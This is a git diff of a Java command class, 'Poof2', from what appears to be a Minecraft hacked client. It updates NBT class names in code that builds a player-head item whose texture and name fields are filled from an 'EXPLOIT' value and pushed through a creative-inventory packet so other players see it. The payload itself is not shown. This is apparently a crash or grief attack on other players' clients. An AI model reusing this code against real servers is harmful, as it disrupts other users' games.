@@ -4,10 +4,10 @@ import me.zeroX150.cornos.Cornos;
 import me.zeroX150.cornos.features.command.Command;
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
-import net.minecraft.nbt.CompoundTag;
-import net.minecraft.nbt.IntArrayTag;
-import net.minecraft.nbt.ListTag;
-import net.minecraft.nbt.StringTag;
+import net.minecraft.nbt.NbtCompound;
+import net.minecraft.nbt.NbtIntArray;
+import net.minecraft.nbt.NbtList;
+import net.minecraft.nbt.NbtString;
 import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
 
 public class Poof2 extends Command {
@@ -47,18 +47,18 @@ public class Poof2 extends Command {
 
         // create item stack with exploit
         ItemStack is = new ItemStack(Items.PLAYER_HEAD, 0x1);
-        CompoundTag skullOwner = is.getOrCreateSubTag("SkullOwner");
+        NbtCompound skullOwner = is.getOrCreateSubTag("SkullOwner");
 
         // put the funnies
-        CompoundTag props = new CompoundTag();
-        ListTag textures = new ListTag();
-        CompoundTag texturesI1 = new CompoundTag();
-        texturesI1.put("Value", StringTag.of(EXPLOIT.toString()));
+        NbtCompound props = new NbtCompound();
+        NbtList textures = new NbtList();
+        NbtCompound texturesI1 = new NbtCompound();
+        texturesI1.put("Value", NbtString.of(EXPLOIT.toString()));
         textures.add(texturesI1);
         props.put("textures", textures);
-        props.put("Name", StringTag.of(E1.toString()));
+        props.put("Name", NbtString.of(E1.toString()));
 
-        skullOwner.put("Id", new IntArrayTag(EID));
+        skullOwner.put("Id", new NbtIntArray(EID));
         skullOwner.put("Properties", props);
 
         // and let others see
